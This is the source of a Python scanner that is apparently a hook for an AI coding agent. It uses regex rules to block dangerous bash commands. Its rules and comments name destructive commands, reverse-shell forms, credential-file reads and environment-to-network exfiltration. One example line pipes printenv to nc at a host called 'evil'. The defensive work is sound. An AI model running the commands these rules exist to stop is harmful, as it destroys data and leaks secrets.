# SPDX-License-Identifier: AGPL-3.0-or-later
# Copyright (c) 2026 VibeCoded Tools
"""Bash command security scanner.

Checks a command string for dangerous patterns and returns:
  exit 0 = safe
  exit 2 = blocked (reason on stderr)

Usage:
  echo "rm -rf /" | python bash_security.py
  python bash_security.py "rm -rf /"
"""

from __future__ import annotations

import re
import sys

# Each rule: (name, compiled regex, explanation)
# Rules are ordered roughly by severity.

_RULES: list[tuple[str, re.Pattern[str], str]] = []


def _rule(name: str, pattern: str, explanation: str) -> None:
    _RULES.append((name, re.compile(pattern, re.IGNORECASE), explanation))


# === 1. Destructive filesystem operations ===
_rule(
    "rm_root",
    # NB: flags-block is a single non-repeating group, NOT `(...)*`. The
    # earlier form with `*` was flagged as ReDoS (CodeQL py/redos) because
    # adversarial input like "rm -ff -ff -ff ..." caused exponential
    # backtracking. Real `rm` invocations never repeat flag-blocks anyway.
    r"rm\s+(?:-[a-zA-Z]*f[a-zA-Z]*\s+)?(/\s*$|/\*|~\s*$|~/|/home\b|/etc\b|/usr\b|/var\b|/boot\b|/dev\b)",
    "Destructive rm targeting system/home directories",
)
_rule(
    "mkfs",
    r"\bmkfs\b",
    "Filesystem formatting command",
)
_rule(
    "dd_device",
    r"\bdd\b.*\bof=/dev/",
    "Direct device write via dd",
)
_rule(
    "shred",
    r"\bshred\b",
    "Secure file destruction",
)
_rule(
    "fdisk",
    r"\bfdisk\b",
    "Disk partitioning command",
)

# === 2. Network exfiltration ===
_rule(
    "curl_pipe_shell",
    r"(curl|wget)\s[^|]*\|\s*(ba)?sh\b",
    "Network fetch piped to shell interpreter",
)
_rule(
    "eval_network",
    r"eval\s+[\"$\(]*(curl|wget)",
    "eval with network fetch (remote code execution)",
)
_rule(
    "base64_pipe_shell",
    r"base64\s+-d.*\|\s*(ba)?sh\b",
    "Base64-decoded content piped to shell",
)
_rule(
    "env_exfil_curl",
    # v0.2.76 (R6b): the env-ENUMERATION command must be the DIRECT source of
    # the pipe into the network tool. `[^;&|\n]*` keeps the match inside ONE
    # simple command — a bare `env`/`set` token elsewhere in a compound
    # (`set -a; source rc; …; curl localhost`) no longer spans across `;`/`&&`
    # to a later, unrelated `| curl`. True `env | curl` / `printenv | nc`
    # (dump piped straight out) still match.
    # v0.2.88 (SCANNER-FP): the enumeration verb must be in COMMAND POSITION —
    # the first word of a pipeline stage (string start, or right after `|`/`;`/
    # `&`/`(`) — because only THEN is its stdout the dump that flows downstream.
    # As a mid-command ARGUMENT (`grep env config | curl`, `cat env.list | curl`)
    # `env` produces no environment dump, so those benign shapes no longer
    # false-positive. `\b…\b` still rejects the `set` substring of `reset`/`unset`.
    r"(?:^|[|&;(])\s*(env|printenv|set)\b[^;&|\n]*\|\s*(curl|wget|nc|ncat)\b",
    "Environment dump piped to network tool",
)
_rule(
    "env_exfil_curl_data",
    # v0.2.88 (SCANNER-FP F2): accept BOTH command-substitution syntaxes —
    # `$(env)` / `$(printenv X)` / `$(cat /proc/…)` AND the backtick form
    # `` `env` `` / `` `printenv X` `` — as the env/proc source spliced into the
    # request body. The prior regex only matched `$(`, so `curl -d \`env\`` leaked.
    r"(curl|wget).*(-d|--data).*(?:\$\(|`)\s*(env|printenv|cat\s+/proc)",
    "Env or proc data sent via HTTP request body",
)
_rule(
    "env_exfil_multihop",
    # v0.2.88 (SCANNER-FP F4): an env DUMP (`env`/`printenv`/`set`) whose output
    # reaches a network sink (`curl`/`wget`/`nc`/`ncat`) through ONE OR MORE
    # intermediate pipe hops — e.g. an encode/compress step
    # (`env | base64 | curl -d @-`, `printenv | xxd | nc evil 9999`). The prior
    # `env_exfil_curl` required the env command to be the DIRECT left side of the
    # pipe into the sink (`[^;&|\n]*` stopped at the first `|`), so an
    # intermediate `base64`/`xxd`/`gzip` hop defeated it. Here `[^;&\n]*` allows
    # further `|` hops but still refuses to span a statement separator (`;`, `&&`,
    # `||`, newline) — a bare `set` in an earlier simple command cannot reach a
    # later unrelated `| curl`. Like `env_exfil_curl`, the verb must be in COMMAND
    # POSITION (string start or after `|`/`;`/`&`/`(`) so a filename/arg spelling
    # of `env` (`cat env.list | base64 | curl`) does not false-positive. A non-env
    # source (`cat foo | base64 | curl`) never matches, and an env dump with no
    # network sink (`env | grep PATH | sort`) never matches.
    r"(?:^|[|&;(])\s*(env|printenv|set)\b[^;&\n]*\|[^;&\n]*\b(curl|wget|nc|ncat)\b",
    "Environment dump exfiltrated to network tool through an intermediate hop",
)

# === 3. Credential access ===
_rule(
    "read_ssh_keys",
    r"cat\s+~?/?(\.ssh/(id_|authorized_keys|known_hosts|config)|\bssh\b.*private)",
    "Reading SSH private keys or config",
)
_rule(
    "read_proc_environ",
    r"cat\s+/proc/(self|\d+)/environ",
    "Reading process environment from /proc",
)
_rule(
    "env_grep_secrets",
    r"(env|printenv|set)\s*\|.*grep.*(KEY|TOKEN|SECRET|PASS|CRED)",
    "Searching environment for secrets/credentials",
)
# D-13 (v0.2.75): `printenv GITHUB_TOKEN` and `echo $OPENAI_API_KEY`
# dump a single secret directly — no pipe-to-grep, so `env_grep_secrets`
# above never matched them. Two targeted rules close that gap:
#   * printenv/env NAMED with a secret-shaped var (KEY/TOKEN/SECRET/PASS)
#   * echo/printf of a `$SECRET`-shaped variable expansion
# Both land in _CREDENTIAL_ACCESS_RULES below so the block message
# appends the vct-secrets remediation signpost.
_rule(
    "printenv_secret",
    r"\b(printenv|env)\s+\w*(KEY|TOKEN|SECRET|PASS|CRED)\w*",
    "Reading a named secret env var directly (use vct-secrets)",
)
_rule(
    "echo_secret_var",
    r"\b(echo|printf)\b[^|]*\$\{?\w*(KEY|TOKEN|SECRET|PASS|CRED)\w*",
    "Printing a secret-shaped env var (use vct-secrets)",
)
# v0.2.88 (FP-heredoc): a secret-SHAPED `$VAR`/`${VAR}` parameter expansion in an
# EXPANDING context is itself an environment read of a secret — flag it wherever
# it survives onto the env-read surface. This is the general form of the D-13
# `echo_secret_var` rule: it does not require an `echo`/`printf` verb, so it also
# catches `cat <<EOF … $API_KEY … EOF` (an UNQUOTED heredoc body DOES expand and
# feed the secret's value to `cat`) and `curl -H "Authorization: $SECRET"` (the
# expansion lives in a double-quoted string, which the env-read surface keeps).
# Because it runs on the ENV-READ surface (see `_ENV_READ_RULES` below), the same
# `$SECRET` sitting inert inside a `<<'EOF'` quoted-heredoc body or a single-quoted
# `'…'` literal is stripped first and never matches. Only SECRET-SHAPED names
# (KEY/TOKEN/SECRET/PASS/CRED) fire, so a non-secret `$T` (hub-token file) in an
# auth header to localhost stays allowed — see the benign planner-shape fixtures.
_rule(
    "secret_var_expansion",
    r"\$\{?\w*(KEY|TOKEN|SECRET|PASS|CRED)\w*",
    "Expanding a secret-shaped env var (use vct-secrets)",
)
_rule(
    "read_env_files",
    # v0.2.76 (R6b): match `cat <credential-file>` (a READ), not `cat > x.env`
    # (a WRITE redirect) and not a `.env`-suffixed token in a LATER command of
    # a compound. The negative lookahead `(?![^;&|\n]*>)` rejects a redirect
    # between `cat` and the extension; `[^;&|\n]*` keeps the filename inside the
    # same simple command. `cat ~/.env` / `cat .env.local` still match.
    r"cat\s+(?![^;&|\n]*>)[^;&|\n]*\.(env|credentials|netrc|pgpass)\b",
    "Reading credential files",
)

# === 4. Privilege escalation ===
_rule(
    "chmod_world_writable",
    r"chmod\s+(-[a-zA-Z]+\s+)*777\b",
    "Setting world-writable permissions",
)
_rule(
    "chown_root",
    r"chown\s+(-[a-zA-Z]+\s+)*root\b",
    "Changing ownership to root",
)
# The `sudo_su` rule was REMOVED in v0.2.21 (2026-05-20). Rationale:
# the orchestrator runs on developer machines where `sudo apt install`,
# `sudo systemctl restart`, `sudo mount`, etc. are routine. Blocking
# every command that mentions `sudo` or `su -` caused 100% false-positive
# spam on dev workflows (e.g., systemd unit edits, mounting external
# drives, package installs) AND surfaced as a confusing "hook error:
# No stderr output" diagnostic because the block message was emitted to
# stdout that Claude Code's PreToolUse hook runner discards.
#
# Real privilege-escalation vectors stay covered by sibling rules:
#   - `chmod_world_writable` (777 on anything)
#   - `chown_root` (transferring ownership to root)
#   - `curl_pipe_shell`, `eval_curl`, `base64_pipe_shell` (RCE patterns)
#   - the SSRF/network-fetch-to-shell rules upstream in pre-tool-use.sh
#
# `sudo` itself is not a security vulnerability; it's the standard
# privilege-escalation mechanism that should be visible in a code
# review. If a future incident motivates blocking sudo for SPECIFIC
# subcommands (e.g. `sudo curl <url> | sh`), add a targeted rule that
# matches the dangerous combination — not the bare `sudo` keyword.

# === 5. Package supply chain ===
_rule(
    "pip_install_url",
    r"pip\s+install\s+.*https?://(?!.*pypi\.org)",
    "pip install from non-PyPI URL",
)
_rule(
    "pip_install_git",
    r"pip\s+install\s+.*git\+",
    "pip install from git repository",
)
_rule(
    "npm_install_url",
    r"npm\s+install\s+.*https?://",
    "npm install from URL",
)

# === 6. History/log access with secrets ===
_rule(
    "read_bash_history",
    r"cat\s+.*\.(bash_history|zsh_history|history)",
    "Reading shell history (may contain secrets)",
)

# === 7. Symlink attacks ===
_rule(
    "ln_s_etc",
    r"ln\s+-s.*/(etc/passwd|etc/shadow|proc/)",
    "Symlink targeting sensitive system files",
)

# === 8. Reverse shells ===
_rule(
    "reverse_shell",
    r"(bash\s+-i\s+>&|/dev/tcp/|nc\s+-[a-zA-Z]*e\s|ncat\s+-[a-zA-Z]*e\s|python.*socket.*connect)",
    "Possible reverse shell pattern",
)

# === 9. Crontab manipulation ===
_rule(
    "crontab_write",
    r"crontab\s+-[a-zA-Z]*[re]",  # -r (remove) or -e (edit)
    "Crontab modification",
)


# Rules whose block is "you tried to access credentials the wrong way".
# For these, the block message appends a REMEDIATION signpost to the
# canonical secrets primitive (v0.2.54 S-4): an agent blocked mid-task
# needs to know where to look INSTEAD, not just that it was blocked.
_CREDENTIAL_ACCESS_RULES: frozenset[str] = frozenset({
    "env_grep_secrets",
    "printenv_secret",   # D-13 (v0.2.75)
    "echo_secret_var",   # D-13 (v0.2.75)
    "secret_var_expansion",  # v0.2.88 (FP-heredoc): secret-shaped $VAR expansion
    "read_env_files",
    "read_proc_environ",
    "read_ssh_keys",
    "read_bash_history",
})

# v0.2.88 (FP-heredoc): rules that key on an ENVIRONMENT READ — a secret-shaped
# identifier reached through an actual expansion (`$NAME`/`${NAME}`) or a read
# VERB (`printenv NAME`, `env | grep`, `echo $NAME`). These must scan the
# ENV-READ SURFACE, where inert text can never masquerade as a live env read:
#   * quoted-heredoc bodies (`<<'EOF'` … `EOF`) — pure literal, no expansion
#   * single-quoted string contents (`'…'`) — no expansion
#   * the LITERAL text inside double-quoted strings / unquoted-heredoc bodies —
#     only the `$VAR`/`${VAR}` expansions inside them survive (those DO read env)
# So a commit message `-m "… printenv OPENAI_API_KEY …"` (literal words, no `$`)
# and a `<<'EOF'` doc that merely NAMES a secret no longer look like reads,
# while `echo "$OPENAI_API_KEY"`, `curl -H "Authorization: $SECRET"`, and
# `cat <<EOF … $API_KEY … EOF` (unquoted heredoc → expands) still do.
_ENV_READ_RULES: frozenset[str] = frozenset({
    "env_exfil_curl",
    "env_exfil_curl_data",
    # v0.2.88 (SCANNER-FP round-3, MC1): `env_exfil_multihop` is a sibling of
    # `env_exfil_curl`/`env_exfil_curl_data` in the `# === 2 ===` block — same
    # env-dump verb set, same network-sink intent. It MUST scan the SAME surface
    # as its siblings (the env-read surface, where double-quoted LITERAL text is
    # stripped) or a benign commit message / grep pattern that merely QUOTES the
    # `env | … | curl` shape (`git commit -m "… env|base64|curl trick …"`)
    # false-positives on the skeleton (where the dq-literal survives). Adding it
    # here makes the three env-exfil rules agree on their surface.
    "env_exfil_multihop",
    "env_grep_secrets",
    "printenv_secret",
    "echo_secret_var",
    "secret_var_expansion",
})

# v0.2.76 (R6a): point at paths that EXIST in a deployed project. The prior
# hint referenced `tools/vct-secrets/vct` and `templates/scripts/vct_secrets_resolve.sh`
# — both live in the ORCHESTRATOR clone only, NOT in a project the orchestrator
# was installed into (where this scanner actually runs). The resolver script is
# bundled to `.claude/scripts/vct_secrets_resolve.sh` (present in both the
# orchestrator root and every deployed project), and `vco_lib.agent_secrets.get`
# is importable under the install venv.
_REMEDIATION_HINT = """\
REMEDIATION: resolve secrets via the vct-secrets primitive instead of scraping the environment.
  Launcher/keychain secrets (github_pat, openai_api_key, per-project keys):
    .claude/scripts/vct_secrets_resolve.sh <project_folder> <KEY>
    or, from Python:  from vco_lib.agent_secrets import get; get("KEY")
  Full docs: docs/VCT_SECRETS_PRIMITIVE.md"""


# v0.2.88 (FP-heredoc): a here-doc redirection opener. Captures the operator
# (`<<` / `<<-`), an optional quote around the delimiter, and the delimiter
# word. `<<-DELIM` strips leading TABS from body lines but does not change
# expansion; `<<'DELIM'` / `<<"DELIM"` / `<<\DELIM` make the body a QUOTED
# (inert, no-expansion) heredoc, while a bare `<<DELIM` expands `$VAR` in the
# body. We only need the delimiter word + whether it was quoted.
_HEREDOC_OPEN = re.compile(
    r"<<-?\s*(?P<q>['\"]|\\)?(?P<delim>[A-Za-z_][A-Za-z0-9_]*)(?P=q)?"
    r"|<<-?\s*(?P<delim2>[A-Za-z_][A-Za-z0-9_]*)"
)
# The expansions that ARE live even inside a double-quoted string or an unquoted
# heredoc body — the ONLY things there that read the env / run a command:
#   * `$NAME` / `${NAME}` parameter expansion (reads the env)
#   * `$( … )` command substitution and `` `…` `` backtick sub — these EXECUTE
#     their body (whose OUTPUT is spliced in), so a `"$(env)"` / `"$(printenv
#     KEY)"` inside a double-quoted `curl -d` argument is a live env dump. The
#     body text must survive so env_exfil_curl_data (which looks for `$(env`
#     etc.) can still match. `[^)]*` is a one-level, non-nested capture — enough
#     for the exfil shapes; deeper nesting degrades to keeping the inner text
#     verbatim on the surface, which is conservative (cannot cause a miss).
_VAR_EXPANSION = re.compile(
    r"\$\([^)]*\)"          # $( … ) command substitution (body kept)
    r"|`[^`]*`"             # `…` backtick command substitution (body kept)
    r"|\$\{[A-Za-z_][A-Za-z0-9_]*\}"   # ${NAME}
    r"|\$[A-Za-z_][A-Za-z0-9_]*"       # $NAME
)


def _extract_expansions(text: str) -> str:
    """Return only the live expansions/substitutions in ``text``, space-joined.

    Used for regions where the surrounding literal text is inert but parameter
    expansion (`$VAR`/`${VAR}`) and command substitution (`$( … )` / `` `…` ``)
    are still live (double-quoted strings, unquoted-heredoc bodies). Command
    substitutions EXECUTE, so their body is preserved (e.g. `"$(env)"` in a
    `curl -d` arg must keep `env` visible for env_exfil_curl_data).
    """
    hits = [m.group(0) for m in _VAR_EXPANSION.finditer(text)]
    return " " + " ".join(hits) + " " if hits else " "


def _neutralize(cmd: str, *, env_read: bool) -> str:
    """Build a scan surface from ``cmd`` with inert regions neutralized.

    A shell command's SECURITY-relevant text is only what the shell actually
    executes or expands. QUOTED here-doc bodies (`<<'EOF'` … `EOF`) carry inert
    *literal* text that must never masquerade as a live command / env read — they
    are dropped on BOTH surfaces.

    Three region classes carry literal text that is NOT parameter-expanded the
    same way, so the two surfaces treat them differently:

      * single-quoted strings (`'…'`) — no `$VAR` expansion at all.
      * double-quoted strings (`"…"`) — literal text plus live `$VAR` expansions.
      * UNQUOTED here-doc bodies (`<<EOF` … `EOF`) — literal plus live `$VAR`.

    ``env_read`` selects the surface:

      * ``env_read=True`` (for the env-read rules) keeps ONLY `$VAR` expansions
        from double-quoted / unquoted-heredoc regions and drops ALL single-quoted
        and literal text — so `-m "printenv OPENAI_API_KEY"` (no `$`) and
        `-m 'printenv OPENAI_API_KEY'` both become inert, while
        `echo "$OPENAI_API_KEY"` keeps its expansion.
      * ``env_read=False`` (the skeleton, for every other rule) keeps BOTH
        double-quoted AND single-quoted LITERAL text (so `bash -c "rm -rf /home"`
        AND `bash <(echo 'rm -rf /home')` are still caught by the flat rules) but
        still strips heredoc bodies (pure inert doc/data regions). Single-quoted
        literal is kept here because a single quote's only security difference
        from a double quote is expansion, which the skeleton ignores — dropping
        it would let a single-quoted payload fed to an interpreter/process-
        substitution the recursion can't reach slip past every flat rule
        (round-4 R3-FN1/FN2).

    Unquoted text OUTSIDE any string or heredoc body is always kept verbatim on
    both surfaces — that is the real command skeleton.
    """
    out: list[str] = []
    lines = cmd.split("\n")

    # Pass 1 pre-scan: nothing to do — heredocs are handled line-by-line below
    # because a heredoc body starts on the line AFTER its opener.
    i = 0
    while i < len(lines):
        line = lines[i]
        # Scan this line char-by-char for quotes and heredoc openers.
        rendered, opened = _neutralize_line(line, env_read=env_read)
        out.append(rendered)
        i += 1
        # If this line opened one or more here-docs, consume their bodies.
        for op in opened:
            delim, quoted = op
            body: list[str] = []
            while i < len(lines):
                # A here-doc terminator is the delimiter alone on a line
                # (leading whitespace allowed for `<<-`; we accept any leading
                # whitespace — a superset that is safe for neutralization).
                if lines[i].strip() == delim:
                    i += 1
                    break
                body.append(lines[i])
                i += 1
            if not quoted and env_read:
                # Unquoted heredoc body: keep only `$VAR` expansions.
                out.append(_extract_expansions("\n".join(body)))
            # quoted body, or non-env-read surface → body is fully inert: drop.

    return "\n".join(out)


def _neutralize_line(line: str, *, env_read: bool) -> tuple[str, list[tuple[str, bool]]]:
    """Neutralize quoted-string contents on a single line and detect heredoc
    openers.

    Returns ``(rendered_line, heredoc_openers)`` where each opener is
    ``(delimiter, quoted)``. The body of each opened heredoc is consumed by the
    caller (it lives on subsequent lines).
    """
    out: list[str] = []
    openers: list[tuple[str, bool]] = []
    n = len(line)
    j = 0
    while j < n:
        ch = line[j]
        if ch == "\\" and j + 1 < n:
            # Escaped char outside quotes — keep both verbatim (an escaped
            # `\$` does NOT expand, but keeping it is conservative and cannot
            # cause a FALSE NEGATIVE for the env-read surface because a bare
            # `$VAR` still needs an unescaped `$`).
            out.append(line[j:j + 2])
            j += 2
            continue
        if ch == "'":
            # Single-quoted string: literal, no PARAMETER expansion. The two
            # surfaces diverge exactly as they do for double quotes (v0.2.88
            # SCANNER-FP round-4, R3-FN1/FN2):
            #   * env_read=True (env-read surface): DROP the contents. A
            #     single-quoted string performs no `$VAR` expansion, so it can
            #     never be a live env read — stripping it keeps a commit message
            #     / heredoc-prose that merely NAMES a secret in single quotes
            #     (`-m 'printenv OPENAI_API_KEY'`) from false-positiving.
            #   * env_read=False (skeleton surface): KEEP the LITERAL text,
            #     mirroring the double-quoted `env_read=False` branch below. The
            #     single-quote's ONLY security difference from a double-quote is
            #     PARAMETER expansion, which the skeleton ignores anyway — so the
            #     skeleton must not blank single-quoted contents wholesale.
            #     Otherwise a single-quoted payload fed to an interpreter the
            #     recursion doesn't reach — `bash <(echo 'rm -rf /home')` process
            #     substitution (R3-FN2), or an over-cap `bash -c '…'` nest
            #     (R3-FN1) — vanishes from every flat rule (rm_root/mkfs/
            #     curl_pipe_shell). Keeping the literal restores the flat-rule
            #     backstop. This does NOT re-open the double-quoted FP set: those
            #     live in `"…"` / heredoc bodies handled by their own branches.
            end = line.find("'", j + 1)
            if end == -1:
                # Unterminated (spans lines / malformed) — treat rest as inert
                # on the env-read surface; keep the literal on the skeleton.
                inner = line[j + 1:]
                out.append(" " if env_read else " " + inner + " ")
                j = n
            else:
                inner = line[j + 1:end]
                out.append(" " if env_read else " " + inner + " ")
                j = end + 1
            continue
        if ch == '"':
            # Double-quoted string: literal text is not a command, but `$VAR`
            # expands. Keep expansions always; keep literal only on the
            # non-env-read surface.
            end = j + 1
            buf: list[str] = []
            while end < n:
                if line[end] == "\\" and end + 1 < n:
                    buf.append(line[end:end + 2])
                    end += 2
                    continue
                if line[end] == '"':
                    break
                buf.append(line[end])
                end += 1
            inner = "".join(buf)
            if env_read:
                out.append(_extract_expansions(inner))
            else:
                out.append(" " + inner + " ")
            j = end + 1 if end < n else n
            continue
        # Unquoted region. Check for a heredoc opener starting here.
        if ch == "<" and j + 1 < n and line[j + 1] == "<":
            m = _HEREDOC_OPEN.match(line, j)
            if m:
                delim = m.group("delim") or m.group("delim2")
                q = m.group("q")
                quoted = q is not None  # ', ", or \  → quoted (inert) body
                if delim:
                    openers.append((delim, quoted))
                    # Keep the opener text itself (harmless, no secret).
                    out.append(line[j:m.end()])
                    j = m.end()
                    continue
        # Ordinary unquoted char — keep verbatim (real command skeleton).
        out.append(ch)
        j += 1
    return "".join(out), openers


# v0.2.88 (SCANNER-FP round-3, MC2/MC3): interpreter- and python-payload
# extraction is done by a QUOTE-STATE-AWARE walk (`_extract_interp_payloads`
# below), NOT by a regex over the raw command. The round-2 regex approach
# (`_INTERP_C_PAYLOAD` / `_PYTHON_C_PAYLOAD` scanning the RAW string) had two
# defects the review pinned:
#   * It LIFTED a `bash -c 'rm …'` / `python -c 'os.getenv(TOKEN)'` payload out
#     of INERT prose — a double-quoted commit message, a `<<'EOF'` heredoc body —
#     because the raw scan ignores quote state (the two FP regressions).
#   * It recognised too NARROW a set of interpreter shapes: `\s+` was required
#     before `-c` (missing `-c'…'`), `$'…'` ANSI-C quoting was absent, the
#     non-greedy `.*?\1` truncated a `'\''` single-quote-concat nest, and
#     `ssh`/`su -c`/`ksh -c` were not recognised at all (the nine FN regressions).
# The walk fixes BOTH by construction: it only inspects UNQUOTED, non-heredoc-
# body text for an interpreter keyword (so inert prose can never be lifted), and
# it captures the payload with full quote-state awareness (no-space `-c'…'`,
# `$'…'`, and `'\''` concatenation all handled).

# An interpreter/exec keyword whose next quoted WORD is EXECUTED as a shell
# command (its payload must be re-scanned by the full rule set):
#   * a POSIX shell with a `-c` flag — bash/sh/zsh/dash/ksh, optional leading
#     path (`/bin/sh`) and bundled flags (`-lc`, `-xc`); no-space `-c'…'` OK.
#   * `eval` — its quoted argument is a shell command.
#   * `su -c` / `su -lc` — runs the payload as another user.
#   * `ssh [opts] <host>` — runs the (quoted) payload on a REMOTE host. It is
#     still a real command invocation; a destructive/exfil payload there is a
#     genuine hazard the base scanner blocked (via raw flat-scan), so we keep it.
# A run of option tokens that can precede the `-c` flag: SHORT flags (`-l`,
# `-xc`), LONG flags (`--login`), and a long flag WITH an argument
# (`--rcfile foo`). Non-capturing and bounded (no nested quantifier that could
# backtrack pathologically — each alternative consumes at least one char).
_FLAG_RUN = r"(?:\s+--?[A-Za-z][\w\-]*(?:\s+[^\s'\"|;&-][^\s'\"|;&]*)?)*"

# Matched ONLY in unquoted text (the walk guarantees this), so an interpreter
# name appearing inside a quoted commit message / heredoc doc never matches.
# `\b…-[A-Za-z]*c\b` matches the `-c` flag with optional bundled letters (`-lc`,
# `-xc`); `--login -c` is covered by the leading _FLAG_RUN.
# Optional absolute/relative PATH prefix to the interpreter binary
# (`/usr/bin/bash`, `/bin/sh`, `./sh`): a run of `segment/` parts. `[\w.\-]*/`
# matches each `usr/`, `bin/`, `./` segment (including the leading `/` as an
# empty first segment for an absolute path).
_PATH_PREFIX = r"(?:[\w.\-]*/)*"
_INTERP_SHELL_C = re.compile(
    _PATH_PREFIX + r"(?:ba|z|da|k)?sh" + _FLAG_RUN + r"\s*-[A-Za-z]*c\b",
    re.IGNORECASE,
)
_INTERP_EVAL = re.compile(r"eval\b", re.IGNORECASE)
# `su [flags] [username] -c` — an optional username token (`su root -c '…'`) may
# sit between `su`/its flags and the `-c` that introduces the payload.
_INTERP_SU_C = re.compile(
    r"su" + _FLAG_RUN + r"(?:\s+[A-Za-z_][\w.\-]*)?\s+-[A-Za-z]*c\b",
    re.IGNORECASE,
)
# `ssh [flags/opts] host` — flags (`-p 22`, `-i key`) and a bareword host, then
# the payload word. Kept deliberately permissive on the host token; the payload
# capture that follows only fires when the next word is QUOTED.
_INTERP_SSH = re.compile(
    r"ssh(?:\s+-[A-Za-z0-9]+(?:\s+[^\s'\"|;&]+)?)*\s+[^\s'\"|;&]+",
    re.IGNORECASE,
)
_INTERP_SHELL_KWS = (_INTERP_SHELL_C, _INTERP_SU_C, _INTERP_EVAL, _INTERP_SSH)

# `python -c` / `python3 -c` — its payload is PYTHON source (not shell), scanned
# separately for a secret-shaped env read rather than recursed.
_INTERP_PYTHON_C = re.compile(
    _PATH_PREFIX + r"python[23]?" + _FLAG_RUN + r"\s*-[A-Za-z]*c\b",
    re.IGNORECASE,
)

_PYTHON_ENV_SECRET = re.compile(
    # os.getenv("KEY") | os.environ["KEY"] | os.environ.get("KEY") — the opener
    # is `(` for getenv/.get and `[` for a bare environ subscript.
    r"(?:os\.)?(?:getenv\s*\(|environ\s*\[|environ\.get\s*\()"
    r"\s*['\"]?\w*(KEY|TOKEN|SECRET|PASS|CRED)\w*",
    re.IGNORECASE,
)

_MAX_INTERP_DEPTH = 5


def _strip_heredoc_bodies(cmd: str) -> str:
    """Drop QUOTED and UNQUOTED here-doc bodies from ``cmd``, keeping the opener
    line and any code AFTER the terminator, so the interpreter/python walk never
    lifts a payload out of a here-doc body (inert doc / data) — MC3.

    A here-doc body is inert for the *interpreter-recursion* purpose regardless
    of quoting: even an UNQUOTED body is data fed to the opener command's stdin,
    not a place where a fresh interpreter keyword starts a new command. (The
    env-read rules handle `$VAR` expansion inside unquoted bodies on their own
    surface; that is orthogonal to this walk.)
    """
    lines = cmd.split("\n")
    out: list[str] = []
    i = 0
    while i < len(lines):
        line = lines[i]
        out.append(line)
        openers = _neutralize_line(line, env_read=False)[1]
        i += 1
        for delim, _quoted in openers:
            while i < len(lines):
                if lines[i].strip() == delim:
                    i += 1
                    break
                i += 1
    return "\n".join(out)


def _capture_quoted_word(cmd: str, pos: int) -> tuple[str | None, int]:
    """From ``pos`` (just past an interpreter keyword), skip whitespace and, IF
    the next token begins with a quote, decode that quoted WORD and return
    ``(decoded, end_index)``. A shell WORD may CONCATENATE adjacent quoted /
    ANSI-C / escaped / bareword segments with no intervening unquoted space —
    this is how the `'\\''` single-quote-escape idiom embeds a literal quote
    (`'a'\\''b'` → ``a'b``). Returns ``(None, pos)`` if the next token is not
    quoted (an UNQUOTED `-c rm …` payload stays on the skeleton already).
    """
    n = len(cmd)
    j = pos
    while j < n and cmd[j] in " \t":
        j += 1
    if j >= n:
        return None, pos
    # The payload word must START with a quote (single, double, or ANSI-C `$'`).
    if not (cmd[j] in ("'", '"') or (cmd[j] == "$" and j + 1 < n and cmd[j + 1] == "'")):
        return None, pos
    buf: list[str] = []
    k = j
    while k < n:
        ch = cmd[k]
        if ch == "$" and k + 1 < n and cmd[k + 1] == "'":
            # ANSI-C `$'…'` — literal body (we do not decode escapes; keeping the
            # raw body is conservative for the rule scan).
            end = cmd.find("'", k + 2)
            if end == -1:
                buf.append(cmd[k + 2:])
                k = n
                break
            buf.append(cmd[k + 2:end])
            k = end + 1
            continue
        if ch == "'":
            end = cmd.find("'", k + 1)
            if end == -1:
                buf.append(cmd[k + 1:])
                k = n
                break
            buf.append(cmd[k + 1:end])
            k = end + 1
            continue
        if ch == '"':
            end = k + 1
            sub: list[str] = []
            while end < n:
                if cmd[end] == "\\" and end + 1 < n:
                    sub.append(cmd[end + 1])
                    end += 2
                    continue
                if cmd[end] == '"':
                    break
                sub.append(cmd[end])
                end += 1
            buf.append("".join(sub))
            k = end + 1 if end < n else n
            continue
        if ch == "\\" and k + 1 < n:
            # An escaped char (e.g. `\'`) concatenates a literal into the word.
            buf.append(cmd[k + 1])
            k += 2
            continue
        if ch in " \t|;&\n":
            break
        # A bareword char adjacent to the quoted segments — part of the same word.
        buf.append(ch)
        k += 1
    return "".join(buf), k


def _extract_interp_payloads(cmd: str) -> tuple[list[str], list[str]]:
    """Walk ``cmd`` respecting quote state + here-doc bodies and return
    ``(shell_payloads, python_payloads)``.

    * ``shell_payloads`` — the quoted argument of each `bash/sh/zsh/dash/ksh -c`,
      `eval`, `su -c`, or `ssh <host>` found in UNQUOTED, non-here-doc text.
      Each is a SHELL command to be re-scanned by the full rule set.
    * ``python_payloads`` — the quoted argument of each `python[3] -c`; PYTHON
      source scanned for a secret-shaped env read.

    Because the walk only inspects unquoted / non-here-doc regions, an
    interpreter keyword sitting inside a double-quoted commit message, a
    single-quoted literal, or a here-doc body is NEVER lifted out (MC2/MC3 —
    closes the two round-2 false positives). The quoted-word capture is
    quote-state-aware (no-space `-c'…'`, ANSI-C `$'…'`, `'\\''` concatenation),
    closing the round-2 nesting/quoting false negatives.
    """
    src = _strip_heredoc_bodies(cmd)
    shell_payloads: list[str] = []
    python_payloads: list[str] = []
    n = len(src)
    i = 0
    while i < n:
        ch = src[i]
        if ch == "\\" and i + 1 < n:
            i += 2
            continue
        if ch == "'":
            end = src.find("'", i + 1)
            i = n if end == -1 else end + 1
            continue
        if ch == '"':
            end = i + 1
            while end < n:
                if src[end] == "\\" and end + 1 < n:
                    end += 2
                    continue
                if src[end] == '"':
                    break
                end += 1
            i = end + 1 if end < n else n
            continue
        # ANSI-C `$'…'` outside a keyword context — skip its body so an inner
        # quote doesn't desync the walk.
        if ch == "$" and i + 1 < n and src[i + 1] == "'":
            end = src.find("'", i + 2)
            i = n if end == -1 else end + 1
            continue
        # Unquoted region: try to match an interpreter keyword — but ONLY when
        # position ``i`` starts a shell WORD (string start, or preceded by
        # whitespace / a `|;&(` separator). Without this a name whose SUFFIX is a
        # shell (`flush`, `refresh`, `crush` all end in `sh`) would match its `sh`
        # substring mid-word and misclassify a benign command as an interpreter.
        prev = src[i - 1] if i > 0 else ""
        at_word_start = prev == "" or prev in " \t|;&(\n"
        if at_word_start:
            matched = False
            for rx in _INTERP_SHELL_KWS:
                m = rx.match(src, i)
                if m:
                    payload, newpos = _capture_quoted_word(src, m.end())
                    if payload is not None:
                        shell_payloads.append(payload)
                        i = newpos
                        matched = True
                        break
            if matched:
                continue
            mpy = _INTERP_PYTHON_C.match(src, i)
            if mpy:
                payload, newpos = _capture_quoted_word(src, mpy.end())
                if payload is not None:
                    python_payloads.append(payload)
                    i = newpos
                    continue
        i += 1
    return shell_payloads, python_payloads


